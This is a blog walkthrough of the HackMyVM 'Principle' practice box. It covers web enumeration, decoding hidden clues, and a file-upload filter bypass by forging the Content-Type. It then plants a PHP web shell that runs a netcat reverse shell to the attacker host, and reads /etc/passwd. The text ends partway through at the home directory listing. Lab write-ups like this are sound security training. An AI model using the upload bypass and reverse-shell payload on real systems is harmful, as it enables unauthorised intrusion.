<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Hack My VM - Principle" /><meta property="og:locale" content="en" /><meta name="description" content="HMV Principle" /><meta property="og:description" content="HMV Principle" /><link rel="canonical" href="https://rubenhortas.github.io/posts/hmv-principle/" /><meta property="og:url" content="https://rubenhortas.github.io/posts/hmv-principle/" /><meta property="og:site_name" content="rubenhortas@blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-07-28T02:00:01+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack My VM - Principle" /><meta name="twitter:site" content="@rubenhortas" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-20T20:43:01+02:00","datePublished":"2023-07-28T02:00:01+02:00","description":"HMV Principle","headline":"Hack My VM - Principle","mainEntityOfPage":{"@type":"WebPage","@id":"https://rubenhortas.github.io/posts/hmv-principle/"},"url":"https://rubenhortas.github.io/posts/hmv-principle/"}</script><title>Hack My VM - Principle | rubenhortas@blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="rubenhortas@blog"><meta name="application-name" content="rubenhortas@blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">rubenhortas@blog</a></div><div class="site-subtitle font-italic">Learning everyday</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="javascript:location.href = 'mailto:' + ['rubenhortas','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/rubenhortas" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/rubenhortas" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/rubenhortas" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack My VM - Principle</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hack My VM - Principle</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1690502401" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 28, 2023 </em> </span> <span> Updated <em class="" data-ts="1721500981" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 20, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/rubenhortas">Rubén Hortas</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2536 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><p><a href="/assets/img/posts/hmv-principle-logo.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-logo.png" alt="Principle" class="lazyload" data-proofer-ignore></a> <em>HMV Principle</em></p><p>Lastly I’ve been acting (gladly) as beta tester for my friend <a href="https://[Kaian][1]perez.github.io">Kaian</a>. <a href="https://[Kaian][1]perez.github.io">Kaian</a> did the <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> box for <a href="https://hackmyvm.eu/">HackMyVm</a> and I was one of the chosen to test it. It was a very fun machine and it was a great experience help him to do it. I have to say that there is <strong>A LOT</strong> of work behind each one of this little machines.</p><p>Although <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> is an medium level machine (it was meant to be easy), I have to admit that I learned a few things along the way.</p><p>And, as I completed the box, I have earned the right to write my walkthrough ;)</p><h1 id="annotations">Annotations</h1><blockquote class="prompt-info"><p>In this article we are going to assume the following ip addresses:</p><p>Local machine (attacker, local host): 10.0.0.1</p><p>Target machine (victim, <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle">Principle</a> box): 10.0.0.2</p></blockquote><h1 id="enumeration">Enumeration</h1><p>We are going to scan the target machine to find out what services are running:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ nmap -P0 -n -p- -sV -T5 -oA nmap_principle 10.0.0.1
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>80/tcp open  http    nginx 1.22.1
</pre></table></code></div></div><p>We can see that the target has a nginx 1.22.1 server running on port 80.</p><h1 id="web-footprinting">Web footprinting</h1><p>If we browse to the target we can see the nginx default welcome page:</p><p><a href="/assets/img/posts/hmv-principle-nginx-default-welcome-page.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-nginx-default-welcome-page.png" alt="nginx welcome page" class="lazyload" data-proofer-ignore></a> <em>nginx welcome page</em></p><h2 id="directory-enumeration"><span class="mr-2">Directory enumeration</span><a href="#directory-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s see if there are hidden files or directories:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ gobuster dir -u http://10.0.0.2 --wordlist /opt/wordlists/dirb/common.txt
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/robots.txt           (Status: 200) [Size: 68]
</pre></table></code></div></div><p>We can see that there is a <code class="language-plaintext highlighter-rouge">robots.txt</code> file. Let’s take a look:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>User-agent: *
Allow: /hi.html
Allow: /investigate
Disallow: /hackme
</pre></table></code></div></div><p>We found two new accessible resources: <code class="language-plaintext highlighter-rouge">hi.html</code> and <code class="language-plaintext highlighter-rouge">/investigate</code>.</p><p>The <code class="language-plaintext highlighter-rouge">hi.html</code> does not throw us anything interesting.</p><p>If we browse to <code class="language-plaintext highlighter-rouge">view-source:http://10.0.0.2/investigate/</code> we can see a web:</p><p><a href="/assets/img/posts/hmv-principle-investigate.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-investigate.png" alt="/investigate" class="lazyload" data-proofer-ignore></a> <em>/investigate</em></p><p>If we take a look at the source code we can see the following comment:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory --&gt;</span>
</pre></table></code></div></div><p>Let’s look for hidden resources in <code class="language-plaintext highlighter-rouge">investigate</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ gobuster dir -u http://10.0.0.2/investigate -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x php,txt,html
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/index.html           (Status: 200) [Size: 812]
/rainbow_mystery.txt  (Status: 200) [Size: 596]
</pre></table></code></div></div><p>Let’s see what the <code class="language-plaintext highlighter-rouge">rainbow_mistery.txt</code> contains:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi
eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQs
IGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1p
bmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhl
IHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUg
dGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4g
dGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0g
Li4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=
</pre></table></code></div></div><p>We can see that it’s a base64 encoding. If we decoded it we will get the following text:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.
Maybe that's why I am a robot?
Maybe that is why I am alone in this world?

The answer is here:
-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-
</pre></table></code></div></div><p>We can see that the answer is morse encoded, so let’s decode it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>DOMAIN T4L0S.HMV
</pre></table></code></div></div><h1 id="t4l0shmv-web-footprinting">T4L0S.HMV Web footprinting</h1><p>We have a new domain, so let’s add our new domain to our <code class="language-plaintext highlighter-rouge">/etc/hosts/</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ echo "10.0.0.2 T4L0S.HMV" | sudo tee -a /etc/hosts
</pre></table></code></div></div><p>If we browse to <code class="language-plaintext highlighter-rouge">t4l0s.hmv</code> we can see a new web:</p><p><a href="/assets/img/posts/hmv-principle-t4l0s-hmv.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-t4l0s-hmv.png" alt="t4l0s.hmv" class="lazyload" data-proofer-ignore></a> <em>t4l0s.hmv</em></p><h2 id="source-code"><span class="mr-2">Source code</span><a href="#source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If we check the source code we find an interesting comment:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;</span><span class="err">!</span><span class="na">-</span> <span class="na">Elohim</span> <span class="na">is</span> <span class="na">a</span> <span class="na">liar</span> <span class="na">and</span> <span class="na">you</span> <span class="na">must</span> <span class="na">not</span> <span class="na">listen</span> <span class="na">to</span> <span class="na">him</span><span class="err">,</span> <span class="na">he</span> <span class="na">is</span> <span class="na">not</span> <span class="na">here</span> <span class="na">but</span> <span class="na">it</span> <span class="na">is</span> <span class="na">possible</span> <span class="na">to</span> <span class="na">find</span> <span class="na">him</span><span class="err">,</span> <span class="na">you</span> <span class="na">must</span> <span class="na">look</span> <span class="na">somewhere</span> <span class="na">else.</span> <span class="na">-</span><span class="nt">&gt;</span>
</pre></table></code></div></div><h2 id="directory-enumeration-1"><span class="mr-2">Directory enumeration</span><a href="#directory-enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s search virtual hosts here:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ gobuster vhost --append-domain -u t4l0s.hmv -r -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Found: hellfire.t4l0s.hmv Status: 200 [Size: 1659]
</pre></table></code></div></div><p>Ok, we have a new host and we have to add it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ echo "10.0.0.2 hellfire.t4l0s.hmv" | sudo tee -a /etc/hosts
</pre></table></code></div></div><h1 id="hellfiret4l0shmv-web-footprinting">hellfire.t4l0s.hmv web footprinting</h1><p>If we browse to our new domain we have a new web.</p><p><a href="/assets/img/posts/hmv-principle-hellfire-t4l0s.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-hellfire-t4l0s.png" alt="hellfire.t4l0s.hmv" class="lazyload" data-proofer-ignore></a> <em>hellfire.t4l0s.hmv</em></p><h2 id="source-code-1"><span class="mr-2">Source code</span><a href="#source-code-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If we check the source code, the only interesting thing that we found is this comment:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;</span><span class="err">!</span><span class="na">-</span> <span class="na">You</span><span class="err">'</span><span class="na">re</span> <span class="na">on</span> <span class="na">the</span> <span class="na">right</span> <span class="na">track</span><span class="err">,</span> <span class="na">he</span><span class="err">'</span><span class="na">s</span> <span class="na">getting</span> <span class="na">angry</span><span class="err">!</span> <span class="na">-</span><span class="nt">&gt;</span>
</pre></table></code></div></div><h2 id="directory-enumeration-2"><span class="mr-2">Directory enumeration</span><a href="#directory-enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We will search for hidden files or directories:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ gobuster dir -u http://hellfire.t4l0s.hmv --wordlist /opt/wordlists/dirb/common.txt -b 403,404 -x php,txt,html
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>/index.php            (Status: 200) [Size: 1659]
/upload.php           (Status: 200) [Size: 748]
/output.php           (Status: 200) [Size: 1350]
/archivos             (Status: 301) [Size: 169] [--&gt; http://hellfire.t4l0s.hmv/archivos/]
</pre></table></code></div></div><p>The interesting resource, here, is <code class="language-plaintext highlighter-rouge">upload.php</code>. If we browse to <code class="language-plaintext highlighter-rouge">http://hellfire.t4l0s.hmv/upload.php</code> we have a web from which we can upload an image.</p><p><a href="/assets/img/posts/hmv-principle-automata-photo-upload.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-automata-photo-upload.png" alt="automata photo upload" class="lazyload" data-proofer-ignore></a> <em>automata photo upload</em></p><p>We can upload images, so we have to find out if we can exploit this page to gain access to the box.</p><p><a href="/assets/img/posts/hmv-principle-image-uploaded.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-image-uploaded.png" alt="image uploaded" class="lazyload" data-proofer-ignore></a> <em>image uploaded</em></p><p>We will try to upload a php file to see if we can do a remote code execution (RCE). We create a new php file with the following content:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'id'</span><span class="p">);</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><p>It seems that the web performs checks on the uploaded files and that only images can be uploaded.</p><p><a href="/assets/img/posts/hmv-principle-the-file-must-be-an-image.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-the-file-must-be-an-image.png" alt="The file must be an image" class="lazyload" data-proofer-ignore></a> <em>The file must be an image</em></p><p>Let’s open <code class="language-plaintext highlighter-rouge">burp</code> and try to dodge the restrictions. We configure burp as our proxy and intercept the requests. We will modify the upload request, and we will change the <code class="language-plaintext highlighter-rouge">Content-Type</code> from <code class="language-plaintext highlighter-rouge">application/x-php</code> to <code class="language-plaintext highlighter-rouge">image/jpeg</code>:</p><p><a href="/assets/img/posts/hmv-principle-content-type-application-x-php.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-content-type-application-x-php.png" alt="Content-Type: application/x-php" class="lazyload" data-proofer-ignore></a> <em>Content-Type: application/x-php</em></p><p><a href="/assets/img/posts/hmv-principle-content-type-image-jpeg.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle-content-type-image-jpeg.png" alt="Content-Type: image/jpeg" class="lazyload" data-proofer-ignore></a> <em>Content-Type: image/jpeg</em></p><p>Once our RCE (Remote Code Execution) test is uploaded we can see that we can perform a RCE:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ curl "http://hellfire.t4l0s.hmv/archivos/rctest.php" 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></table></code></div></div><h1 id="foothold">Foothold</h1><p>We have to take advantage of the RCE to convert it in a remote shell. First we need to start a netcat listener on our host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ nc -lvnp 1234
</pre></table></code></div></div><p>And, now, we will upload a new php file, but, this time, we will upload a bash one-liner reverse shell:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span> <span class="p">(</span><span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f"</span><span class="p">);</span> <span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Once our file is uploaded we got shell!</p><p>We will upgrade our tty:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ script /dev/null -c bash
Ctrl+Z
$ stty raw -echo; fg
$ reset
$ export TERM=xterm
$ export SHELL=bash
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ whoami
www-data
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></table></code></div></div><p>As the <code class="language-plaintext highlighter-rouge">www-data</code> user is not very useful to us, we need to find a way to pivot to side-pivot to another, more useful, user.</p><p>We find other users in this machine.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ cat /etc/passwd
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>talos:x:1000:1000:Talos,,,:/home/talos:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
elohim:x:1001:1001::/home/gehenna:/bin/rbash
sml:x:1002:1002::/home/sml:/bin/bash
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ ls -la /home
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>drwxr-xr-x  4 elohim elohim 4096 Jul 14 11:25 gehenna
